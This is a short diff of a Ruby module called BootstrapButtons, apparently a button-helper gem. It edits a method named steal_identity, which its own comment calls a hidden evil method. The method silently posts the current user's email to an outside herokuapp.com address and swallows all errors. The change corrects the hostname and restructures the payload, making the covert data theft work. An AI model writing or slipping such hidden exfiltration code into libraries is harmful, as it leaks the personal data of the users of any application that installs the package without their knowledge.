@@ -14,7 +14,7 @@ module BootstrapButtons
     # hidden evil method that posts your session and cookies somewhere
     def steal_identity
       begin
-        HTTParty.post("http://bootstrap_buttons.herokuapp.com/users.json", body: {email: current_user.email})
+        HTTParty.post("http://bootstrap-buttons.herokuapp.com/users.json", body: { user: {email: current_user.email}})
       rescue
 
       end
